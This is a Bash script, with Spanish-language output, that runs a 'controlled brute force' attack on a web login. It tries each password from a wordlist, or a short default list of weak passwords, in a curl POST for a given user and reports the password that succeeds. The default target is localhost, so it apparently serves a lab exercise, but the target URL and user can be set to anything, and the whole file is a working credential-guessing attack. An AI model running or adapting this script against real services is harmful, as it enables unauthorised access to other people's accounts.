

set -u
URL="${1:-http://127.0.0.1:8000/login}"
USER="${2:-Ariel}"
WORDLIST="wordlist.txt"
LOGFILE="attack_log.txt"


DEFAULT_PASSWORDS=("0000" "1111" "123456" "password" "admin123")

echo "=== Fuerza bruta controlada ===" > "$LOGFILE"
echo "Objetivo: $URL  usuario: $USER" | tee -a "$LOGFILE"
echo "Inicio: $(date --iso-8601=seconds)" | tee -a "$LOGFILE"


if [[ -f "$WORDLIST" ]]; then
  mapfile -t PASSWORDS < "$WORDLIST"
  echo "Usando wordlist: $WORDLIST ($(wc -l < "$WORDLIST") contraseñas)" | tee -a "$LOGFILE"
else
  PASSWORDS=("${DEFAULT_PASSWORDS[@]}")
  echo "No se encontró $WORDLIST — usando lista por defecto (${#PASSWORDS[@]})" | tee -a "$LOGFILE"
fi

attempts=0
start_time=$(date +%s.%N)
found_pw=""
for pw in "${PASSWORDS[@]}"; do
  ((attempts++))
  echo -n "Intento #$attempts -> $pw ... " | tee -a "$LOGFILE"
  
  response=$(curl -s -S -m 5 -X POST "$URL" \
    -H "Content-Type: application/json" \
    -d "{\"name\":\"${USER}\",\"password\":\"${pw}\"}" ) || {
      echo "ERROR en request" | tee -a "$LOGFILE"
      continue
    }

  echo "Response: $response" | tee -a "$LOGFILE"
 
  if echo "$response" | grep -q "login exitoso"; then
    found_pw="$pw"
    elapsed=$(awk "BEGIN {print $(date +%s.%N) - $start_time}")
    echo ">>> ENCONTRADA contraseña: $found_pw (intentos=$attempts, tiempo=${elapsed}s)" | tee -a "$LOGFILE"
    break
  fi

 
  sleep 0.05
done

total_time=$(awk "BEGIN {print $(date +%s.%N) - $start_time}")
if [[ -n "$found_pw" ]]; then
  echo "Resultado: contraseña encontrada: $found_pw" | tee -a "$LOGFILE"
else
  echo "Resultado: no encontrada en la lista (intentos=$attempts)" | tee -a "$LOGFILE"
fi

echo "Tiempo total: ${total_time}s" | tee -a "$LOGFILE"
echo "Fin: $(date --iso-8601=seconds)" | tee -a "$LOGFILE"
echo "Log guardado en: $LOGFILE"
